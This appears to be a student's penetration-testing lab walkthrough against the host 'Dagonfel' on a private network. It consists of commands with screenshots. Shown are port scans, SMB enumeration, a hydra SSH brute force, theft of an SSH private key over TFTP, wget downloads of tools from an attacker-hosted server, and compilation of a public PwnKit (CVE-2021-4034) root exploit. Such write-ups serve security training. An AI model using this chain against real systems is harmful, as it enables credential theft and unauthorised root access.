# Dagonfel 192.168.2.24
## Andrea Zonnekus 18758119

sudo nmap -p- -sV -sT -O 192.168.2.24 -oN host

![](dagonfel_steps/Aspose.Words.d917fd4e-222e-4507-8475-49630bf72757.001.png)

smbmap -H 192.168.2.24

![](dagonfel_steps/Aspose.Words.d917fd4e-222e-4507-8475-49630bf72757.002.png)

enum4linux -a 192.168.2.24

![](dagonfel_steps/Aspose.Words.d917fd4e-222e-4507-8475-49630bf72757.003.png)

hydra -l centurion -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.24 -m ssh

![](dagonfel_steps/Aspose.Words.d917fd4e-222e-4507-8475-49630bf72757.004.png)



sudo nmap -sV -sU 192.168.2.24 -oN host\_udp

![](dagonfel_steps/Aspose.Words.d917fd4e-222e-4507-8475-49630bf72757.005.png)

sudo nmap -sU -sV --script "ntp\* and (discovery or vuln) and not (dos or brute)" -p 123 192.168.2.24

![](dagonfel_steps/Aspose.Words.d917fd4e-222e-4507-8475-49630bf72757.006.png)

(system arch)

https://github.com/EnableSecurity/tftptheft

python2 thief.py -p 69 192.168.2.24

![](dagonfel_steps/Aspose.Words.d917fd4e-222e-4507-8475-49630bf72757.007.png)

ls download

![](dagonfel_steps/Aspose.Words.d917fd4e-222e-4507-8475-49630bf72757.008.png)

tftp 192.168.2.24 -c get id\_rsa

![](dagonfel_steps/Aspose.Words.d917fd4e-222e-4507-8475-49630bf72757.009.png)

sudo chmod 700 id\_rsa

![](dagonfel_steps/Aspose.Words.d917fd4e-222e-4507-8475-49630bf72757.010.png)



ssh centurion@192.168.2.24 -i id\_rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa

![](dagonfel_steps/Aspose.Words.d917fd4e-222e-4507-8475-49630bf72757.011.png)

php -S 0.0.0.0:80

![](dagonfel_steps/Aspose.Words.d917fd4e-222e-4507-8475-49630bf72757.012.png)

wget 10.8.0.106/les.sh

![](dagonfel_steps/Aspose.Words.d917fd4e-222e-4507-8475-49630bf72757.013.png)

find / -perm -u=s -type f 2>/dev/null

![](dagonfel_steps/Aspose.Words.d917fd4e-222e-4507-8475-49630bf72757.014.png)

wget 10.8.0.106/linpeas.sh

![](dagonfel_steps/Aspose.Words.d917fd4e-222e-4507-8475-49630bf72757.015.png)

./linpeas.sh

![](dagonfel_steps/Aspose.Words.d917fd4e-222e-4507-8475-49630bf72757.016.png)

<https://github.com/berdav/CVE-2021-4034>

wget 10.8.0.106/pwnkit.tar.gz

![](dagonfel_steps/Aspose.Words.d917fd4e-222e-4507-8475-49630bf72757.017.png)

tar -xvf pwnkit.tar.gz

cd CVE-2021-4034-main/

make

./ cve-2021-4034

![](dagonfel_steps/Aspose.Words.d917fd4e-222e-4507-8475-49630bf72757.018.png)

whoami

![](dagonfel_steps/Aspose.Words.d917fd4e-222e-4507-8475-49630bf72757.019.png)
